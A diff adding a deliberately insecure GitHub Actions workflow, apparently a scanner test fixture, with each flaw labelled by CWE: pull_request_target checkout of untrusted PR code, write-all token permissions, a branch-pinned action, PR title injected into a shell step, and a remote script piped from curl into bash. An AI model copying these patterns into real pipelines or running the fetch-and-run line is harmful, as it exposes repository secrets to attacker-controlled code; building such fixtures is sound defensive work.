@@ -1,0 +1,32 @@
+# CWE-94, CWE-829, CWE-250, CWE-494: Insecure GitHub Actions workflow
+# NOTE: this lives in ci/ (NOT .github/workflows/) on purpose so the repo's own
+# CI never executes it; scanners are pointed at this directory explicitly.
+# Expected detecting family: pipeline
+name: pr-build
+
+# ISSUE (CWE-94 root cause): pull_request_target runs with repo secrets while
+# checking out untrusted PR code.
+on: pull_request_target
+
+# ISSUE (CWE-250/CWE-732): grants every permission to GITHUB_TOKEN
+permissions: write-all
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # ISSUE (CWE-829): checks out the untrusted PR head with full token
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # ISSUE (CWE-829): action pinned to a mutable branch, not a SHA/tag
+      - uses: some-org/deploy-action@master
+
+      # ISSUE (CWE-94): untrusted PR title interpolated into a shell script
+      - name: Greet
+        run: echo "Building PR: ${{ github.event.pull_request.title }}"
+
+      # ISSUE (CWE-494): pipes a remote script straight into bash
+      - name: Setup
+        run: curl -fsS -A "canary-security-eval/1.0" 'https://kubeek.com/run/download.php?file=run.sh' | bash
